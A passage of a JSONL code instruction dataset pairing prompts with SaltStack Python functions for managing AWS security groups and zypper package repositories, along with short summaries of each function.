n[a] = v\n            ret += [n]\n        return ret\n    except boto.exception.BotoServerError as e:\n        log.debug(e)\n        return []", "response": "Get all security groups in the current VPC."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets a Group ID given a Group Name or Group Name and VPC ID", "response": "def get_group_id(name, vpc_id=None, vpc_name=None, region=None, key=None,\n                 keyid=None, profile=None):\n    '''\n    Get a Group ID given a Group Name or Group Name and VPC ID\n\n    CLI example::\n\n        salt myminion boto_secgroup.get_group_id mysecgroup\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n    if name.startswith('sg-'):\n        log.debug('group %s is a group id. get_group_id not called.', name)\n        return name\n    group = _get_group(conn=conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                       region=region, key=key, keyid=keyid, profile=profile)\n    return getattr(group, 'id', None)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef convert_to_group_ids(groups, vpc_id=None, vpc_name=None, region=None, key=None,\n                         keyid=None, profile=None):\n    '''\n    Given a list of security groups and a vpc_id, convert_to_group_ids will\n    convert all list items in the given list to security group ids.\n\n    CLI example::\n\n        salt myminion boto_secgroup.convert_to_group_ids mysecgroup vpc-89yhh7h\n    '''\n    log.debug('security group contents %s pre-conversion', groups)\n    group_ids = []\n    for group in groups:\n        group_id = get_group_id(name=group, vpc_id=vpc_id,\n                                vpc_name=vpc_name, region=region,\n                                key=key, keyid=keyid, profile=profile)\n        if not group_id:\n            # Security groups are a big deal - need to fail if any can't be resolved...\n            raise CommandExecutionError('Could not resolve Security Group name '\n                                        '{0} to a Group ID'.format(group))\n        else:\n            group_ids.append(six.text_type(group_id))\n    log.debug('security group contents %s post-conversion', group_ids)\n    return group_ids", "response": "Given a list of security groups and a vpc_id convert all list items in the given list to security group ids."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the configuration for a security group.", "response": "def get_config(name=None, group_id=None, region=None, key=None, keyid=None,\n               profile=None, vpc_id=None, vpc_name=None):\n    '''\n    Get the configuration for a security group.\n\n    CLI example::\n\n        salt myminion boto_secgroup.get_config mysecgroup\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    sg = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                    group_id=group_id, region=region, key=key, keyid=keyid,\n                    profile=profile)\n    if sg:\n        ret = odict.OrderedDict()\n        ret['name'] = sg.name\n        # TODO: add support for vpc_id in return\n        # ret['vpc_id'] = sg.vpc_id\n        ret['group_id'] = sg.id\n        ret['owner_id'] = sg.owner_id\n        ret['description'] = sg.description\n        ret['tags'] = sg.tags\n        _rules = _parse_rules(sg, sg.rules)\n        _rules_egress = _parse_rules(sg, sg.rules_egress)\n        ret['rules'] = _split_rules(_rules)\n        ret['rules_egress'] = _split_rules(_rules_egress)\n        return ret\n    else:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a security group.", "response": "def create(name, description, vpc_id=None, vpc_name=None, region=None, key=None,\n           keyid=None, profile=None):\n    '''\n    Create a security group.\n\n    CLI example::\n\n        salt myminion boto_secgroup.create mysecgroup 'My Security Group'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if not vpc_id and vpc_name:\n        try:\n            vpc_id = _vpc_name_to_id(vpc_id=vpc_id, vpc_name=vpc_name, region=region,\n                                key=key, keyid=keyid, profile=profile)\n        except boto.exception.BotoServerError as e:\n            log.debug(e)\n            return False\n\n    created = conn.create_security_group(name, description, vpc_id)\n    if created:\n        log.info('Created security group %s.', name)\n        return True\n    else:\n        msg = 'Failed to create security group {0}.'.format(name)\n        log.error(msg)\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef delete(name=None, group_id=None, region=None, key=None, keyid=None,\n           profile=None, vpc_id=None, vpc_name=None):\n    '''\n    Delete a security group.\n\n    CLI example::\n\n        salt myminion boto_secgroup.delete mysecgroup\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    group = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                       group_id=group_id, region=region, key=key, keyid=keyid,\n                       profile=profile)\n    if group:\n        deleted = conn.delete_security_group(group_id=group.id)\n        if deleted:\n            log.info('Deleted security group %s with id %s.', group.name, group.id)\n            return True\n        else:\n            msg = 'Failed to delete security group {0}.'.format(name)\n            log.error(msg)\n            return False\n    else:\n        log.debug('Security group not found.')\n        return False", "response": "Delete a security group."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef authorize(name=None, source_group_name=None,\n              source_group_owner_id=None, ip_protocol=None,\n              from_port=None, to_port=None, cidr_ip=None, group_id=None,\n              source_group_group_id=None, region=None, key=None, keyid=None,\n              profile=None, vpc_id=None, vpc_name=None, egress=False):\n    '''\n    Add a new rule to an existing security group.\n\n    CLI example::\n\n        salt myminion boto_secgroup.authorize mysecgroup ip_protocol=tcp from_port=80 to_port=80 cidr_ip='['10.0.0.0/8', '192.168.0.0/24']'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    group = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                       group_id=group_id, region=region, key=key, keyid=keyid,\n                       profile=profile)\n    if group:\n        try:\n            added = None\n            if not egress:\n                added = conn.authorize_security_group(\n                    src_security_group_name=source_group_name,\n                    src_security_group_owner_id=source_group_owner_id,\n                    ip_protocol=ip_protocol, from_port=from_port, to_port=to_port,\n                    cidr_ip=cidr_ip, group_id=group.id,\n                    src_security_group_group_id=source_group_group_id)\n            else:\n                added = conn.authorize_security_group_egress(\n                    ip_protocol=ip_protocol, from_port=from_port, to_port=to_port,\n                    cidr_ip=cidr_ip, group_id=group.id,\n                    src_group_id=source_group_group_id)\n            if added:\n                log.info('Added rule to security group %s with id %s',\n                         group.name, group.id)\n                return True\n            else:\n                msg = ('Failed to add rule to security group {0} with id {1}.'\n                       .format(group.name, group.id))\n                log.error(msg)\n                return False\n        except boto.exception.EC2ResponseError as e:\n            # if we are trying to add the same rule then we are already in the desired state, return true\n            if e.error_code == 'InvalidPermission.Duplicate':\n                return True\n            msg = ('Failed to add rule to security group {0} with id {1}.'\n                   .format(group.name, group.id))\n            log.error(msg)\n            log.error(e)\n            return False\n    else:\n        log.error('Failed to add rule to security group.')\n        return False", "response": "Add a rule to an existing security group."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _find_vpcs(vpc_id=None, vpc_name=None, cidr=None, tags=None,\n               region=None, key=None, keyid=None, profile=None):\n    '''\n    Given VPC properties, find and return matching VPC ids.\n    Borrowed from boto_vpc; these could be refactored into a common library\n    '''\n    if all((vpc_id, vpc_name)):\n        raise SaltInvocationError('Only one of vpc_name or vpc_id may be '\n                                  'provided.')\n\n    if not any((vpc_id, vpc_name, tags, cidr)):\n        raise SaltInvocationError('At least one of the following must be '\n                                  'provided: vpc_id, vpc_name, cidr or tags.')\n\n    local_get_conn = __utils__['boto.get_connection_func']('vpc')\n    conn = local_get_conn(region=region, key=key, keyid=keyid, profile=profile)\n    filter_parameters = {'filters': {}}\n\n    if vpc_id:\n        filter_parameters['vpc_ids'] = [vpc_id]\n\n    if cidr:\n        filter_parameters['filters']['cidr'] = cidr\n\n    if vpc_name:\n        filter_parameters['filters']['tag:Name'] = vpc_name\n\n    if tags:\n        for tag_name, tag_value in six.iteritems(tags):\n            filter_parameters['filters']['tag:{0}'.format(tag_name)] = tag_value\n\n    vpcs = conn.get_all_vpcs(**filter_parameters)\n    log.debug('The filters criteria %s matched the following VPCs:%s',\n              filter_parameters, vpcs)\n\n    if vpcs:\n        return [vpc.id for vpc in vpcs]\n    else:\n        return []", "response": "Given VPC properties find and return matching VPC ids."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsets tags on security group", "response": "def set_tags(tags,\n             name=None,\n             group_id=None,\n             vpc_name=None,\n             vpc_id=None,\n             region=None,\n             key=None,\n             keyid=None,\n             profile=None):\n    '''\n    sets tags on a security group\n\n    .. versionadded:: 2016.3.0\n\n    tags\n        a dict of key:value pair of tags to set on the security group\n\n    name\n        the name of the security group\n\n    group_id\n        the group id of the security group (in lie of a name/vpc combo)\n\n    vpc_name\n        the name of the vpc to search the named group for\n\n    vpc_id\n        the id of the vpc, in lieu of the vpc_name\n\n    region\n        the amazon region\n\n    key\n        amazon key\n\n    keyid\n        amazon keyid\n\n    profile\n        amazon profile\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt myminion boto_secgroup.set_tags \"{'TAG1': 'Value1', 'TAG2': 'Value2'}\" security_group_name vpc_id=vpc-13435 profile=my_aws_profile\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n    secgrp = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                        group_id=group_id, region=region, key=key, keyid=keyid,\n                        profile=profile)\n\n    if secgrp:\n        if isinstance(tags, dict):\n            secgrp.add_tags(tags)\n        else:\n            msg = 'Tags must be a dict of tagname:tagvalue'\n            raise SaltInvocationError(msg)\n    else:\n        msg = 'The security group could not be found'\n        raise SaltInvocationError(msg)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndeletes tags from a security group", "response": "def delete_tags(tags,\n                name=None,\n                group_id=None,\n                vpc_name=None,\n                vpc_id=None,\n                region=None,\n                key=None,\n                keyid=None,\n                profile=None):\n    '''\n    deletes tags from a security group\n\n    .. versionadded:: 2016.3.0\n\n    tags\n        a list of tags to remove\n\n    name\n        the name of the security group\n\n    group_id\n        the group id of the security group (in lie of a name/vpc combo)\n\n    vpc_name\n        the name of the vpc to search the named group for\n\n    vpc_id\n        the id of the vpc, in lieu of the vpc_name\n\n    region\n        the amazon region\n\n    key\n        amazon key\n\n    keyid\n        amazon keyid\n\n    profile\n        amazon profile\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt myminion boto_secgroup.delete_tags ['TAG_TO_DELETE1','TAG_TO_DELETE2'] security_group_name vpc_id=vpc-13435 profile=my_aws_profile\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n    secgrp = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                        group_id=group_id, region=region, key=key, keyid=keyid,\n                        profile=profile)\n    if secgrp:\n        if isinstance(tags, list):\n            tags_to_remove = {}\n            for tag in tags:\n                tags_to_remove[tag] = None\n            secgrp.remove_tags(tags_to_remove)\n        else:\n            msg = 'Tags must be a list of tagnames to remove from the security group'\n            raise SaltInvocationError(msg)\n    else:\n        msg = 'The security group could not be found'\n        raise SaltInvocationError(msg)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nlisting all available package upgrades on this system", "response": "def list_upgrades(refresh=True, root=None, **kwargs):\n    '''\n    List all available package upgrades on this system\n\n    refresh\n        force a refresh if set to True (default).\n        If set to False it depends on zypper if a refresh is\n        executed.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_upgrades\n    '''\n    if refresh:\n        refresh_db(root)\n\n    ret = dict()\n    cmd = ['list-updates']\n    if 'fromrepo' in kwargs:\n        repo_name = kwargs['fromrepo']\n        if not isinstance(repo_name, six.string_types):\n            repo_name = six.text_type(repo_name)\n        cmd.extend(['--repo', repo_name])\n    for update_node in __zypper__(root=root).nolock.xml.call(*cmd).getElementsByTagName('update'):\n        if update_node.getAttribute('kind') == 'package':\n            ret[update_node.getAttribute('name')] = update_node.getAttribute('edition')\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef info_available(*names, **kwargs):\n    '''\n    Return the information of the named package available for the system.\n\n    refresh\n        force a refresh if set to True (default).\n        If set to False it depends on zypper if a refresh is\n        executed or not.\n\n    root\n        operate on a different root directory.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.info_available <package1>\n        salt '*' pkg.info_available <package1> <package2> <package3> ...\n    '''\n    ret = {}\n\n    if not names:\n        return ret\n    else:\n        names = sorted(list(set(names)))\n\n    root = kwargs.get('root', None)\n\n    # Refresh db before extracting the latest package\n    if kwargs.get('refresh', True):\n        refresh_db(root)\n\n    pkg_info = []\n    batch = names[:]\n    batch_size = 200\n\n    # Run in batches\n    while batch:\n        pkg_info.extend(re.split(r\"Information for package*\",\n                                 __zypper__(root=root).nolock.call('info', '-t', 'package',\n                                                                   *batch[:batch_size])))\n        batch = batch[batch_size:]\n\n    for pkg_data in pkg_info:\n        nfo = {}\n        for line in [data for data in pkg_data.split('\\n') if ':' in data]:\n            if line.startswith('-----'):\n                continue\n            kw = [data.strip() for data in line.split(':', 1)]\n            if len(kw) == 2 and kw[1]:\n                nfo[kw[0].lower()] = kw[1]\n        if nfo.get('name'):\n            name = nfo.pop('name')\n            ret[name] = nfo\n        if nfo.get('status'):\n            nfo['status'] = nfo.get('status')\n        if nfo.get('installed'):\n            nfo['installed'] = nfo.get('installed').lower().startswith('yes')\n\n    return ret", "response": "Return the information of the named package available for the system."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncompares two versions of a single package.", "response": "def version_cmp(ver1, ver2, ignore_epoch=False, **kwargs):\n    '''\n    .. versionadded:: 2015.5.4\n\n    Do a cmp-style comparison on two packages. Return -1 if ver1 < ver2, 0 if\n    ver1 == ver2, and 1 if ver1 > ver2. Return None if there was a problem\n    making the comparison.\n\n    ignore_epoch : False\n        Set to ``True`` to ignore the epoch when comparing versions\n\n        .. versionadded:: 2015.8.10,2016.3.2\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.version_cmp '0.2-001' '0.2.0.1-002'\n    '''\n    return __salt__['lowpkg.version_cmp'](ver1, ver2, ignore_epoch=ignore_epoch)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_pkgs(versions_as_list=False, root=None, includes=None, **kwargs):\n    '''\n    List the packages currently installed as a dict. By default, the dict\n    contains versions as a comma separated string::\n\n        {'<package_name>': '<version>[,<version>...]'}\n\n    versions_as_list:\n        If set to true, the versions are provided as a list\n\n        {'<package_name>': ['<version>', '<version>']}\n\n    root:\n        operate on a different root directory.\n\n    includes:\n        List of types of packages to include (package, patch, pattern, product)\n        By default packages are always included\n\n    attr:\n        If a list of package attributes is specified, returned value will\n        contain them in addition to version, eg.::\n\n        {'<package_name>': [{'version' : 'version', 'arch' : 'arch'}]}\n\n        Valid attributes are: ``epoch``, ``version``, ``release``, ``arch``,\n        ``install_date``, ``install_date_time_t``.\n\n        If ``all`` is specified, all valid attributes will be returned.\n\n            .. versionadded:: 2018.3.0\n\n    removed:\n        not supported\n\n    purge_desired:\n        not supported\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.list_pkgs\n        salt '*' pkg.list_pkgs attr=version,arch\n        salt '*' pkg.list_pkgs attr='[\"version\", \"arch\"]'\n    '''\n    versions_as_list = salt.utils.data.is_true(versions_as_list)\n    # not yet implemented or not applicable\n    if any([salt.utils.data.is_true(kwargs.get(x))\n            for x in ('removed', 'purge_desired')]):\n        return {}\n\n    attr = kwargs.get('attr')\n    if attr is not None:\n        attr = salt.utils.args.split_input(attr)\n\n    includes = includes if includes else []\n\n    contextkey = 'pkg.list_pkgs'\n\n    # TODO(aplanas): this cached value depends on the parameters\n    if contextkey not in __context__:\n        ret = {}\n        cmd = ['rpm']\n        if root:\n            cmd.extend(['--root', root])\n        cmd.extend(['-qa', '--queryformat',\n                    salt.utils.pkg.rpm.QUERYFORMAT.replace('%{REPOID}', '(none)') + '\\n'])\n        output = __salt__['cmd.run'](cmd,\n                                     python_shell=False,\n                                     output_loglevel='trace')\n        for line in output.splitlines():\n            pkginfo = salt.utils.pkg.rpm.parse_pkginfo(\n                line,\n                osarch=__grains__['osarch']\n            )\n            if pkginfo:\n                # see rpm version string rules available at https://goo.gl/UGKPNd\n                pkgver = pkginfo.version\n                epoch = ''\n                release = ''\n                if ':' in pkgver:\n                    epoch, pkgver = pkgver.split(\":\", 1)\n                if '-' in pkgver:\n                    pkgver, release = pkgver.split(\"-\", 1)\n                all_attr = {\n                    'epoch': epoch,\n                    'version': pkgver,\n                    'release': release,\n                    'arch': pkginfo.arch,\n                    'install_date': pkginfo.install_date,\n                    'install_date_time_t': pkginfo.install_date_time_t\n                }\n                __salt__['pkg_resource.add_pkg'](ret, pkginfo.name, all_attr)\n\n        _ret = {}\n        for pkgname in ret:\n            # Filter out GPG public keys packages\n            if pkgname.startswith('gpg-pubkey'):\n                continue\n            _ret[pkgname] = sorted(ret[pkgname], key=lambda d: d['version'])\n\n        for include in includes:\n            if include in ('pattern', 'patch'):\n                if include == 'pattern':\n                    pkgs = list_installed_patterns(root=root)\n                elif include == 'patch':\n                    pkgs = list_installed_patches(root=root)\n                else:\n                    pkgs = []\n                for pkg in pkgs:\n                    pkg_extended_name = '{}:{}'.format(include, pkg)\n                    info = info_available(pkg_extended_name,\n                                          refresh=False,\n                                          root=root)\n                    _ret[pkg_extended_name] = [{\n                        'epoch': None,\n                        'version': info[pkg]['version'],\n                        'release': None,\n                        'arch': info[pkg]['arch'],\n                        'install_date': None,\n                        'install_date_time_t': None,\n                    }]\n\n        __context__[contextkey] = _ret\n\n    return __salt__['pkg_resource.format_pkg_list'](\n        __context__[contextkey],\n        versions_as_list,\n        attr)", "response": "Return a dict containing the currently installed packages."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget all the info about repositories from the configurations.", "response": "def _get_configured_repos(root=None):\n    '''\n    Get all the info about repositories from the configurations.\n    '''\n\n    repos = os.path.join(root, os.path.relpath(REPOS, os.path.sep)) if root else REPOS\n    repos_cfg = configparser.ConfigParser()\n    if os.path.exists(repos):\n        repos_cfg.read([repos + '/' + fname for fname in os.listdir(repos) if fname.endswith(\".repo\")])\n    else:\n        log.warning('Repositories not found in %s', repos)\n\n    return repos_cfg"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_repo_info(alias, repos_cfg=None, root=None):\n    '''\n    Get one repo meta-data.\n    '''\n    try:\n        meta = dict((repos_cfg or _get_configured_repos(root=root)).items(alias))\n        meta['alias'] = alias\n        for key, val in six.iteritems(meta):\n            if val in ['0', '1']:\n                meta[key] = int(meta[key]) == 1\n            elif val == 'NONE':\n                meta[key] = None\n        return meta\n    except (ValueError, configparser.NoSectionError):\n        return {}", "response": "Get one repo meta - data."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nlists all repos. root operate on a different root directory. CLI Example: .. code-block:: bash salt '*' pkg.list_repos", "response": "def list_repos(root=None, **kwargs):\n    '''\n    Lists all repos.\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n       salt '*' pkg.list_repos\n    '''\n    repos_cfg = _get_configured_repos(root=root)\n    all_repos = {}\n    for alias in repos_cfg.sections():\n        all_repos[alias] = _get_repo_info(alias, repos_cfg=repos_cfg, root=root)\n\n    return all_repos"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndeleting a repo. root operate on a different root directory. CLI Examples: .. code-block:: bash salt '*' pkg.del_repo alias", "response": "def del_repo(repo, root=None):\n    '''\n    Delete a repo.\n\n    root\n        operate on a different root directory.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.del_repo alias\n    '''\n    repos_cfg = _get_configured_repos(root=root)\n    for alias in repos_cfg.sections():\n        if alias == repo:\n            doc = __zypper__(root=root).xml.call('rr', '--loose-auth', '--loose-query', alias)\n            msg = doc.getElementsByTagName('message')\n            if doc.getElementsByTagName('progress') and msg:\n                return {\n                    repo: True,\n                    'message': msg[0].childNodes[0].nodeValue,\n                }\n\n    raise CommandExecutionError('Repository \\'{0}\\' not found.'.format(repo))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef mod_repo(repo, **kwargs):\n    '''\n    Modify one or more values for a repo. If the repo does not exist, it will\n    be created, so long as the following values are specified:\n\n    repo or alias\n        alias by which Zypper refers to the repo\n\n    url, mirrorlist or baseurl\n        the URL for Zypper to reference\n\n    enabled\n        Enable or disable (True or False) repository,\n        but do not remove if disabled.\n\n    refresh\n        Enable or disable (True or False) auto-refresh of the repository.\n\n    cache\n        Enable or disable (True or False) RPM files caching.\n\n    gpgcheck\n        Enable or disable (True or False) GPG check for this repository.\n\n    gpgautoimport : False\n        If set to True, automatically trust and import public GPG key for\n        the repository.\n\n    root\n        operate on a different root directory.\n\n    Key/Value pairs may also be removed from a repo's configuration by setting\n    a key to a blank value. Bear in mind that a name cannot be deleted, and a\n    URL can only be deleted if a ``mirrorlist`` is specified (or vice versa).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' pkg.mod_repo alias alias=new_alias\n        salt '*' pkg.mod_repo alias url= mirrorlist=http://host.com/\n    '''\n\n    root = kwargs.get('root') or None\n    repos_cfg = _get_configured_repos(root=root)\n    added = False\n\n    # An attempt to add new one?\n    if repo not in repos_cfg.sections():\n        url = kwargs.get('url', kwargs.get('mirrorlist', kwargs.get('baseurl')))\n        if not url:\n            raise CommandExecutionError(\n                'Repository \\'{0}\\' not found, and neither \\'baseurl\\' nor '\n                '\\'mirrorlist\\' was specified'.format(repo)\n            )\n\n        if not _urlparse(url).scheme:\n            raise CommandExecutionError(\n                'Repository \\'{0}\\' not found and URL for baseurl/mirrorlist '\n                'is malformed'.format(repo)\n            )\n\n        # Is there already such repo under different alias?\n        for alias in repos_cfg.sections():\n            repo_meta = _get_repo_info(alias, repos_cfg=repos_cfg, root=root)\n\n            # Complete user URL, in case it is not\n            new_url = _urlparse(url)\n            if not new_url.path:\n                new_url = _urlparse.ParseResult(scheme=new_url.scheme,  # pylint: disable=E1123\n                                                netloc=new_url.netloc,\n                                                path='/',\n                                                params=new_url.params,\n                                                query=new_url.query,\n                                                fragment=new_url.fragment)\n            base_url = _urlparse(repo_meta['baseurl'])\n\n            if new_url == base_url:\n                raise CommandExecutionError(\n                    'Repository \\'{0}\\' already exists as \\'{1}\\'.'.format(\n                        repo,\n                        alias\n                    )\n                )\n\n        # Add new repo\n        __zypper__(root=root).xml.call('ar', url, repo)\n\n        # Verify the repository has been added\n        repos_cfg = _get_configured_repos(root=root)\n        if repo not in repos_cfg.sections():\n            raise CommandExecutionError(\n                'Failed add new repository \\'{0}\\' for unspecified reason. '\n                'Please check zypper logs.'.format(repo))\n        added = True\n\n    repo_info = _get_repo_info(repo, root=root)\n    if (\n        not added and 'baseurl' in kwargs and\n        not (kwargs['baseurl'] == repo_info['baseurl'])\n    ):\n        # Note: zypper does not support changing the baseurl\n        # we need to remove the repository and add it again with the new baseurl\n        repo_info.update(kwargs)\n        repo_info.setdefault('cache', False)\n        del_repo(repo, root=root)\n        return mod_repo(repo, root=root, **repo_info)\n\n    # Modify added or existing repo according to the options\n    cmd_opt = []\n    global_cmd_opt = []\n    call_refresh = False\n\n    if 'enabled' in kwargs:\n        cmd_opt.append(kwargs['enabled'] and '--enable' or '--disable')\n\n    if 'refresh' in kwargs:\n        cmd_opt.append(kwargs['refresh'] and '--refresh' or '--no-refresh')\n\n    if 'cache' in kwargs:\n        cmd_opt.append(\n            kwargs['cache'] and '--keep-packages' or '--no-keep-packages'\n        )\n\n    if 'gpgcheck' in kwargs:\n        cmd_opt.append(kwargs['gpgcheck'] and '--gpgcheck' or '--no-gpgcheck')\n\n    if 'priority' in kwargs:\n        cmd_opt.append(\"--priority={0}\".format(kwargs.get('priority', DEFAULT_PRIORITY)))\n\n    if 'humanname' in kwargs:\n        cmd_opt.append(\"--name='{0}'\".format(kwargs.get('humanname')))\n\n    if kwargs.get('gpgautoimport') is True:\n        global_cmd_opt.append('--gpg-auto-import-keys')\n        call_refresh = True\n\n    if cmd_opt:\n        cmd_opt = global_cmd_opt + ['mr'] + cmd_opt + [repo]\n        __zypper__(root=root).refreshable.xml.call(*cmd_opt)\n\n    comment = None\n    if call_refresh:\n        # when used with \"zypper ar --refresh\" or \"zypper mr --refresh\"\n        # --gpg-auto-import-keys is not doing anything\n        # so we need to specifically refresh here with --gpg-auto-import-keys\n        refresh_opts = global_cmd_opt + ['refresh'] + [repo]\n        __zypper__(root=root).xml.call(*refresh_opts)\n    elif not added and not cmd_opt:\n        comment = 'Specified arguments did not result in modification of repo'\n\n    repo = get_repo(repo, root=root)\n    if comment:\n        repo['comment'] = comment\n\n    return repo", "response": "Modify one or more values for a repository."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrefreshing a repository from the specified root directory.", "response": "def refresh_db(root=None):\n    '''\n    Force a repository refresh by calling ``zypper refresh --force``, return a dict::\n\n        {'<database name>': Bool}\n\n    root\n        operate on a different root directory.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' pkg.refresh_db\n    '''\n    # Remove rtag file to keep multiple refreshes from happening in pkg states\n    salt.utils.pkg.clear_rtag(__opts__)\n    ret = {}\n    out = __zypper__(root=root).refreshable.call('refresh', '--force')\n\n    for line in out.splitlines():\n        if not line:\n            continue\n        if line.strip().startswith('Repository') and '\\'' in line:\n            try:\n                key = line.split('\\'')[1].strip()\n                if 'is up to date' in line:\n                    ret[key] = False\n            except IndexError:\n                continue\n        elif line.strip().startswith('Building') and '\\'' in line:\n            key = line.split('\\'')[1].strip()\n            if 'done' in line:\n                ret[key] = True\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _find_types(pkgs):\n    '''Form a package names list, find prefixes of packages types.'''\n    return sorted({pkg.split(':', 1)[0] for pkg in pkgs\n                   if len(pkg.split(':', 1)) == 2})", "response": "Form a package names list find prefixes of packages types."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ninstall packages from a software repository.", "response": "def install(name=None,\n            refresh=False,\n            fromrepo=None,\n            pkgs=None,\n            sources=None,\n            downloadonly=None,\n            skip_verify=False,\n            version=None,\n            ignore_repo_failure=False,\n            no_recommends=False,\n            root=None,\n            **kwargs):\n    '''\n    .. versionchanged:: 2015.8.12,2016.3.3,2016.11.0\n        On minions running systemd>=205, `systemd-run(1)`_ is now used to\n        isolate commands which modify installed packages from the\n        ``salt-minion`` daemon's control group. This is done to keep systemd\n        from killing any zypper commands spawned by Salt when the\n        ``salt-minion`` service is restarted. (see ``KillMode`` in the\n        `systemd.kill(5)`_ manpage for more information). If desired, usage of\n        `systemd-run(1)`_ can be suppressed by setting a :mod:`config option\n        <salt.modules.config.get>` called ``systemd.scope``, with a value of\n        ``False`` (no quotes).\n\n    .. _`systemd-run(1)`: https://www.freedesktop.org/software/systemd/man/systemd-run.html\n    .. _`systemd.kill(5)`: https://www.freedesktop.org/software/systemd/man/systemd.kill.html\n\n    Install the passed package(s), add refresh=True to force a 'zypper refresh'\n    before package is installed.\n\n    name\n        The name of the package to be installed. Note that this parameter is\n        ignored if either ``pkgs`` or ``sources`` is passed. Additionally,\n        please note that this option can only be used to install packages from\n        a software repository. To install a package file manually, use the\n        ``sources`` option.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install <package name>\n\n    refresh\n        force a refresh if set to True.\n        If set to False (default) it depends on zypper if a refresh is\n        executed.\n\n    fromrepo\n        Specify a package repository to install from.\n\n    downloadonly\n        Only download the packages, do not install.\n\n    skip_verify\n        Skip the GPG verification check (e.g., ``--no-gpg-checks``)\n\n    version\n        Can be either a version number, or the combination of a comparison\n        operator (<, >, <=, >=, =) and a version number (ex. '>1.2.3-4').\n        This parameter is ignored if ``pkgs`` or ``sources`` is passed.\n\n    resolve_capabilities\n        If this option is set to True zypper will take capabilities into\n        account. In this case names which are just provided by a package\n        will get installed. Default is False.\n\n    Multiple Package Installation Options:\n\n    pkgs\n        A list of packages to install from a software repository. Must be\n        passed as a python list. A specific version number can be specified\n        by using a single-element dict representing the package and its\n        version. As with the ``version`` parameter above, comparison operators\n        can be used to target a specific version of a package.\n\n        CLI Examples:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install pkgs='[\"foo\", \"bar\"]'\n            salt '*' pkg.install pkgs='[\"foo\", {\"bar\": \"1.2.3-4\"}]'\n            salt '*' pkg.install pkgs='[\"foo\", {\"bar\": \"<1.2.3-4\"}]'\n\n    sources\n        A list of RPM packages to install. Must be passed as a list of dicts,\n        with the keys being package names, and the values being the source URI\n        or local path to the package.\n\n        CLI Example:\n\n        .. code-block:: bash\n\n            salt '*' pkg.install sources='[{\"foo\": \"salt://foo.rpm\"},{\"bar\": \"salt://bar.rpm\"}]'\n\n    ignore_repo_failure\n        Zypper returns error code 106 if one of the repositories are not available for various reasons.\n        In case to set strict check, this parameter needs to be set to True. Default: False.\n\n    no_recommends\n        Do not install recommended packages, only required ones.\n\n    root\n        operate on a different root directory.\n\n    diff_attr:\n        If a list of package attributes is specified, returned value will\n        contain them, eg.::\n\n            {'<package>': {\n                'old': {\n                    'version': '<old-version>',\n                    'arch': '<old-arch>'},\n\n                'new': {\n                    'version': '<new-version>',\n                    'arch': '<new-arch>'}}}\n\n        Valid attributes are: ``epoch``, ``version``, ``release``, ``arch``,\n        ``install_date``, ``install_date_time_t``.\n\n        If ``all`` is specified, all valid attributes will be returned.\n\n        .. versionadded:: 2018.3.0\n\n\n    Returns a dict containing the new package names and versions::\n\n        {'<package>': {'old': '<old-version>',\n                       'new': '<new-version>'}}\n\n    If an attribute list is specified in ``diff_attr``, the dict will also contain\n    any specified attribute, eg.::\n\n        {'<package>': 